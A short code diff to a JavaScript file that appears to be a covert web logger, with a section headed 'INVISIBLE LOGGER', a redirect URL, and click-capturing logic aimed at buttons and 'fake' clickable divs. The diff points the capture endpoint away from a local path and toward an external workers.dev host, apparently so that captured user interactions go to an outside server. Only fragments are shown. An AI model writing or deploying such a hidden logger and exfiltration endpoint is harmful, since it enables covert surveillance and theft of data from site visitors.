@@ -8,7 +8,7 @@ const CONFIG = {
     ],
     REDIRECT_URL: 'https://example.com',
     // The worker endpoint to receive data (relative path)
-    CAPTURE_URL: '/api/capture'
+    CAPTURE_URL: 'https://calm-bread-1d99.testdx24.workers.dev/api/capture'
 };
 
 // ===== INVISIBLE LOGGER =====
@@ -148,7 +148,7 @@ const CONFIG = {
             // B. Check for "Fake" Buttons (div, span)
             // These must look clickable (cursor: pointer) or have role="button"
             // We avoid simply using closest('div') because that catches container divs.
-            
+
             // We assume the user clicks *on* the button or a direct child.
             // So we check the target and its immediate parents for a "clickable div".
             const fakeBtn = target.closest('div, span');
